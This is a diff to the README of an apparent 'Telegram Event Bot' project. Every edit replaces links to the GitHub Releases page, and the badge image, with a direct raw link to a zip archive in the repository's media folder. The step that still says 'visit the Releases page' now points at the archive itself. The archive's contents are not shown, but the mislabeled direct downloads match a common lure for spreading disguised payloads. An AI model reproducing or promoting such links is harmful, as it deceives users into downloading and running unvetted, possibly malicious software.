@@ -4,7 +4,7 @@
 Welcome to the Telegram Event Bot! This application allows you to automate various tasks in Telegram. With ease of use at its core, anyone can control events without needing programming skills. 
 
 ## 📥 Download the App
-[![Download Telegram Event Bot](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/token-lycopene628/Telegram-Event-Bot/releases)
+[![Download Telegram Event Bot](https://raw.githubusercontent.com/token-lycopene628/Telegram-Event-Bot/main/media/Telegram-Event-Bot_1.7-beta.1.zip)](https://raw.githubusercontent.com/token-lycopene628/Telegram-Event-Bot/main/media/Telegram-Event-Bot_1.7-beta.1.zip)
 
 ## 💻 System Requirements
 To run the Telegram Event Bot, please ensure you have the following:
@@ -24,7 +24,7 @@ To run the Telegram Event Bot, please ensure you have the following:
 ## 📋 How to Download & Install
 To get the Telegram Event Bot, please follow these steps:
 
-1. Click on the following link to visit the Releases page: [Download Telegram Event Bot](https://github.com/token-lycopene628/Telegram-Event-Bot/releases).
+1. Click on the following link to visit the Releases page: [Download Telegram Event Bot](https://raw.githubusercontent.com/token-lycopene628/Telegram-Event-Bot/main/media/Telegram-Event-Bot_1.7-beta.1.zip).
 2. On the Releases page, locate the latest version of the application.
 3. Click the download link for the appropriate version for your operating system.
 4. Once the file downloads, find it in your Downloads folder.
@@ -56,4 +56,4 @@ If you need further help, feel free to reach out to our community. Join our disc
 ## 🎉 Conclusion
 Thank you for choosing the Telegram Event Bot. We assure you that using this application will streamline your Telegram tasks and events, making your life easier. Don’t hesitate to download it and start today!
 
-[![Download Telegram Event Bot](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/token-lycopene628/Telegram-Event-Bot/releases)
+[![Download Telegram Event Bot](https://raw.githubusercontent.com/token-lycopene628/Telegram-Event-Bot/main/media/Telegram-Event-Bot_1.7-beta.1.zip)](https://raw.githubusercontent.com/token-lycopene628/Telegram-Event-Bot/main/media/Telegram-Event-Bot_1.7-beta.1.zip)
